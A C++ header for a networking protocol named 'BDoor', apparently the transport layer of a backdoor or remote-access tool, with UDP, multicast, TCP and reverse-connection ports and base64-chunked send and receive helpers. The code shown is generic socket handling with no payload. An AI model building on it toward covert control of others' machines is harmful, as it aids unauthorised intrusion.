#pragma once
#include <winsock2.h>
#include <ws2tcpip.h>
#include <nlohmann/json.hpp>
#include <other/tools.h>
#include <protocol\errorstr.h>
#include <atlimage.h>
#include <fstream>
#pragma comment(lib,"ws2_32.lib") 
using json = nlohmann::json;
#define EMPTYCHAR "0"
#define FIN_CHAR "?"
#define PROTOCOL "Protocol"
#define PROTOCOLNAME "BDoor"
#define COMMANDNAME "CommandName"
#define CONTENT "Content"
#define UDP_PORT 2410
#define GROUP_PORT 2411
#define GROUP_IP "224.1.1.4" 
#define TCP_PORT 2412
#define REVERSE_PORT 2413
#define NOTCOM 0
#define END 1
#define ENTRANCE 2
#define ERROR -1
#define DATAPACKAGE_MAXSIZE 8
#define SEND_TIME 100
#define DEBUG_MODE true
#define IMAGEFORMAT "ImageFormat"
#define IMGDATA "ImgData"
#define TIMEOUT 1000
#define TCP_PACKAGELEN 60000
#define UDP_PACKAGELEN 1024
#define PACKAGE_EXTRA 500
//#define REVERSECONNECT "reverse connect"
vector<string> image_format = { "bmp","emf","wmf","jpeg","png","gif","tiff","exif","icon","heif","webp" };
vector<GUID> GUID_vec = { Gdiplus::ImageFormatBMP,Gdiplus::ImageFormatEMF ,Gdiplus::ImageFormatWMF,
Gdiplus::ImageFormatJPEG,Gdiplus::ImageFormatPNG,Gdiplus::ImageFormatGIF,Gdiplus::ImageFormatTIFF,Gdiplus::ImageFormatEXIF,
Gdiplus::ImageFormatIcon,Gdiplus::ImageFormatHEIF,Gdiplus::ImageFormatWEBP };

void DebugLog(string str) {
	if (DEBUG_MODE) {
		cout << "DebugLog:" << str << endl;
	}
}
int WSAInit() {
	WSADATA wsadata;
	return WSAStartup(MAKEWORD(2, 2), &wsadata);
}
json FormatJson() {
	json j;
	j[PROTOCOL] = PROTOCOLNAME;
	j[COMMANDNAME];
	j[CONTENT];
	return j;
}
json FormatJson(string command_name,string content) {
	json j;
	j[PROTOCOL] = PROTOCOLNAME;
	j[COMMANDNAME] = command_name;
	j[CONTENT] = content;
	return j;
}
json FormatJson(string command_name) {
	json j;
	j[PROTOCOL] = PROTOCOLNAME;
	j[COMMANDNAME] = command_name;
	j[CONTENT];
	return j;
}

namespace udp {
	int SendtoBase64(SOCKET s,sockaddr_in addr, string sendmess) {
		sendmess = EncodeBase64(sendmess, false) + FIN_CHAR;
		int Result;
		string submess;
		int num = 1;
		for (int i = 0; i < sendmess.size(); i++) {
			if (sendmess.size() - i >= UDP_PACKAGELEN) {
				submess = sendmess.substr(i, UDP_PACKAGELEN);
				i += UDP_PACKAGELEN - 1;
			}
			else {
				submess = sendmess.substr(i, sendmess.size() - i);
				i += sendmess.size() - 1;
				DebugLog("last package: " + to_string(submess.size()+1));
			}

			Result = sendto(s, submess.c_str(), submess.size() + 1, 0,(const sockaddr *)&addr,sizeof(addr));
			DebugLog("package num: " + to_string(num));
			DebugLog("package len: " + to_string(submess.size() + 1));
			num++;
			if (Result <= 0) { break; }
		}
		if (Result == SOCKET_ERROR) {
			DebugLog("sendto failed with error: " + to_string(WSAGetLastError()));
			return -1;
		}
		else if (Result == 0) {
			DebugLog(DISCONNECT);
			return 0;
		}
		return 1;
	}
	int RecvfromBase64(SOCKET s,sockaddr_in &sender_addr,string &recvmess) {
		recvmess.clear();
		char buf[UDP_PACKAGELEN+PACKAGE_EXTRA];
		int Result;
		int sender_addr_len = sizeof(sender_addr);
		while (true) {
			memset(buf, 0, sizeof(buf));
			Result = recvfrom(s, buf, sizeof(buf), 0,(sockaddr *)&sender_addr,&sender_addr_len);
			DebugLog("buf strlen: " + to_string(strlen(buf)));
			if (Result <= 0) { break; }
			else {
				recvmess += buf;
				if (recvmess.back() == *FIN_CHAR) {
					recvmess.erase(recvmess.size() - 1);
					break;
				}
			}
		}
		if (Result == SOCKET_ERROR) {
			DebugLog("recvfrom failed with error: " + to_string(WSAGetLastError()));
			return -1;
		}
		else if (Result == 0) {
			DebugLog(DISCONNECT);
			return 0;
		}
		recvmess = DecodeBase64(recvmess, false);
		return 1;
	}
}
namespace tcp {
	/*int SendBase64(SOCKET s, string sendmess) {
		sendmess = EncodeStrInBase64(sendmess);
		int Result = NULL;
		for (int i = 0; i < sendmess.size(); i++) {
			Result = send(s, &sendmess[i], sizeof(sendmess[i]), 0);
			if (Result <= 0) { break; }
			//Sleep(SEND_TIME);
		}
		if (Result == SOCKET_ERROR) {
			wprintf(L"send failed with error: %d\n", WSAGetLastError());
			return -1;
		}
		else if (Result == 0) {
			cout << "连接已断开" << endl;
			return 0;
		}
		Sleep(SEND_TIME);
		Result = send(s, FIN_CHAR, sizeof(FIN_CHAR), 0);
		if (Result == SOCKET_ERROR) {
			wprintf(L"send failed with error: %d\n", WSAGetLastError());
			return -1;
		}
		else if (Result == 0) {
			cout << "连接已断开" << endl;
			return 0;
		}
		return 1;
	}*/
	/*int RecvBase64(SOCKET s, string& recvmess) {
		recvmess = "";
		int Result = NULL;
		char buffer[1024];
		do {
			memset(buffer, 0, sizeof(buffer));
			Result = recv(s, buffer, sizeof(buffer), 0);
			recvmess += buffer;
			DebugLog(buffer);
		} while (string(buffer) != string(FIN_CHAR)&&Result > 0);
		if (Result == SOCKET_ERROR) {
			wprintf(L"recv failed with error: %d\n", WSAGetLastError());
			return -1;
		}
		else if (Result == 0) {
			cout << "连接已断开" << endl;
			return 0;
		}
		recvmess = DecodeStrInBase64(recvmess);
		return 1;
	}*/
	int SendBase64(SOCKET s, string sendmess) {
		sendmess = EncodeBase64(sendmess,false)+FIN_CHAR;
		int Result;
		string submess;
		int num = 1;
		for (int i = 0; i < sendmess.size(); i++) {
			if (sendmess.size() - i >= TCP_PACKAGELEN) {
				submess = sendmess.substr(i, TCP_PACKAGELEN);
				i += TCP_PACKAGELEN - 1;
			}
			else {
				submess = sendmess.substr(i, sendmess.size() - i);
				i += sendmess.size() - 1;
				DebugLog("last package: " + to_string(submess.size()));
			}
			
			Result = send(s, submess.c_str(), submess.size()+1, 0);
			DebugLog("package num: " + to_string(num));
			num++;
			if (Result <= 0) { break; }
		}
		if (Result == SOCKET_ERROR) {
			DebugLog("send failed with error: " + to_string(WSAGetLastError()));
			return -1;
		}
		else if(Result == 0){
			DebugLog(DISCONNECT);
			return 0;
		}
		return 1;
	}
	int RecvBase64(SOCKET s, string& recvmess) {
		recvmess.clear();
		char buf[TCP_PACKAGELEN+PACKAGE_EXTRA];
		int Result;
		while (true) {
			memset(buf, 0, sizeof(buf));
			Result = recv(s, buf, sizeof(buf), 0);
			DebugLog("buf strlen: " + to_string(strlen(buf)));
			if (Result <= 0) { break; }
			else {
				recvmess += buf;
				if(recvmess.back()==*FIN_CHAR){
					recvmess.erase(recvmess.size() - 1);
					break;
				}
			}
		}
		if (Result == SOCKET_ERROR) {
			DebugLog("recv failed with error: " + to_string(WSAGetLastError()));
			return -1;	
		}
		else if (Result == 0) {
			DebugLog(DISCONNECT);
			return 0;
		}
		recvmess = DecodeBase64(recvmess,false);
		return 1;
	}
}